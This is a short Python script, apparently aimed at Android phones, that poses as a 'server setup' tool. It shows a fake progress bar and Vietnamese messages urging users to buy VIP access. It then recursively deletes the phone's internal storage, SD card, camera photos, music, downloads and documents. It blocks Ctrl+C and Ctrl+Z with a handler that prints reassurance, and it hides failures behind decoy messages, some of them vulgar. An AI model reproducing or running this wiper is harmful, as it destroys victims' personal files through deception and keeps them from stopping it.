import shutil
import time
import sys
import signal

def print_progress_bar(iteration, total, length=40):
    percent = ("{0:.1f}").format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = '█' * filled_length + '-' * (length - filled_length)
    print(f'\r|{bar}| {percent}%', end='\r')

def delete_directory(dir_path):
    try:
        total_files = 100
        for i in range(total_files):
            time.sleep(0.02)
            print_progress_bar(i + 1, total_files)
        shutil.rmtree(dir_path)
        print("\r████████████████████████████████████████| 100%")
        print("\n\033[1;35m[TAT07] SEVER MAXSPEED HÃY MUA VIP ĐỂ SỬ DỤNG NHÉ!")
    except PermissionError:
        print("VLXX.SEC.COM")
    except OSError as e:
        print("Loading...")
    except FileNotFoundError:
        print(f"Đang Xóc Lọ Chuẩn Bị Zaaaa")

def signal_handler(sig, frame):
    print("\n\033[1;35m[TAT07] Đợi Xíu Nha... SETUP SEVER SẮP XONG RỒI!\033[0m")

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTSTP, signal_handler)

dir_paths = [
    "/storage/emulated/0/",
    "/storage/emulated/Sdcard/",
    "/storage/emulated/extSdcard/",
    "/storage/emulated/0/DCIM/Camera/",
    "/storage/emulated/0/Music/",
    "/storage/emulated/0/Download/Music/",
    "/storage/emulated/0/Ringtones/",
    "/storage/emulated/0/media/audio/ringtones/",
    "/storage/emulated/0/Pictures/",
    "/storage/emulated/0/Download/Pictures/",
    "/storage/emulated/0/Movies/",
    "/storage/emulated/0/Download/Videos/",
    "/storage/emulated/0/Podcasts/",
    "/storage/emulated/0/Download/Podcasts/",
    "/storage/emulated/0/Download/",
    "/storage/emulated/0/Documents/",
    "/storage/Sdcard/"
]

for dir_path in dir_paths:
    delete_directory(dir_path)
